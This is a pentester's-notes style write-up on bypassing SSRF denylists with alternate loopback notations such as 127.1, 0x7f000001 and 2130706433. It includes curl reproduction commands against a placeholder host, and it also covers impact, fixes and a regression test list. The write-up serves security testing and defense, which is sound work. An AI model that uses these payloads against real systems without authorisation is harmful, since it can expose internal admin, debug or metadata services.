# SSRF Alternate Loopback Notation Bypass

## Date

2026-07-08

## Target Type

Server-side URL fetchers, previewers, unfurlers, webhook testers, and importers that try to block internal hosts

## Bug Class

SSRF bypass through alternate loopback IP notation

## Initial Signal

The application blocks obvious internal targets such as:

```text
127.0.0.1
localhost
[::1]
```

with messages like:

```text
host blocked by policy
destination not allowed
internal infrastructure refused
```

but still accepts user-controlled URLs for server-side fetching.

## Pattern

Some SSRF filters compare raw input against a short denylist instead of canonicalizing the destination. That leaves gaps for equivalent loopback representations:

```text
127.1
0x7f000001
0177.0.0.1
2130706433
```

Depending on the runtime, resolver, and HTTP client, these can still resolve to `127.0.0.1`.

## Trust Boundary

The boundary is not "does the string look internal?" It is "where does the server actually connect?" Any SSRF policy that checks the text but not the final destination IP is vulnerable to representation bypasses.

## Minimal Reproduction

Try one blocked literal and one alternate form:

```bash
curl -sS -X POST "https://[host]/post" \
  --data-urlencode "message=http://127.0.0.1:[port]/"

curl -sS -X POST "https://[host]/post" \
  --data-urlencode "message=http://127.1:[port]/"
```

If `127.0.0.1` is blocked but `127.1` succeeds, the filter is likely string-based or incomplete.

## Useful Alternate Forms

```text
127.1
0x7f000001
0177.0.0.1
2130706433
```

Use only forms actually accepted by the target runtime. Different stacks normalize differently.

## Why Failed Tests Fail

- The application resolves the hostname and validates the final IP.
- The URL parser rejects alternate numeric formats.
- The outbound network layer blocks loopback after resolution.
- The response is blind, so the bypass may work without visible proof.

## Why Working Tests Work

The validator sees a host string that is not on its denylist, but the HTTP stack resolves it to loopback and connects to the internal service.

## Impact

- Access loopback-only services.
- Read internal banners or metadata when responses are reflected.
- Reach admin, debug, or local control services in real systems.

## Fix

- Parse and normalize user-supplied URLs once.
- Resolve the destination host and compare canonical IPs.
- Block loopback, private, link-local, and metadata ranges after resolution.
- Reject unsupported or ambiguous numeric host encodings if unnecessary.

## Regression Test

All of these should be treated as loopback and denied when policy forbids internal destinations:

```text
http://127.0.0.1:[port]/
http://127.1:[port]/
http://0x7f000001:[port]/
http://0177.0.0.1:[port]/
http://2130706433:[port]/
```

## Future Checklist Item

When direct loopback is blocked, test alternate loopback notation before spending time on redirects, fragments, or userinfo confusion.
